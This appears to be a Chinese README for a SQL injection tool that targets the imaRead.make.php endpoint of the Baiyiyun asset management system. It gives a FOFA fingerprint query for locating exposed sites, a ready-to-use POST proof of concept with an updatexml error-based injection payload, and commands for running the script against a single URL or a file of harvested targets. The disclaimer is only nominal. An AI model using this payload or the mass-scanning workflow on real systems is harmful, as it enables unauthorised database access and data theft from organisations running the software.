# SQL注入脚本
渗透项目/渗透工具/脚本文件

例如：***系统的imaRead.make.php接口存在SQL注入

FOFA:

  body="不要着急，点此"

POC：

  POST /adminx/imaRead.make.php?act=remake HTTP/1.1
  
feeItem[]=1+AND+updatexml(1,concat(0x7e,md5(12345678)),1)

Example:（##免责声明：仅用于科学上网绿色实验健康学习##）

!!!本脚本是python环境下运行：

  1.FOFA语句搜索出网址
  
  2.可将网址统一带协议保存到文本文件中
  
  3.调用脚本:(切记要切到这个根目录下显示脚本文件的目录;并且-f读取文件时要注意路径:在文件名称前+路径/文件名,可以是相对路径可以是绝对路径一定是能让系统识别到的路径才能读取到文件)
  
    python3 百易云资管系统imaRead.make.phpSQL注入.py -u yoururl
    
    python3 百易云资管系统imaRead.make.phpSQL注入.py -f filename.txt
    
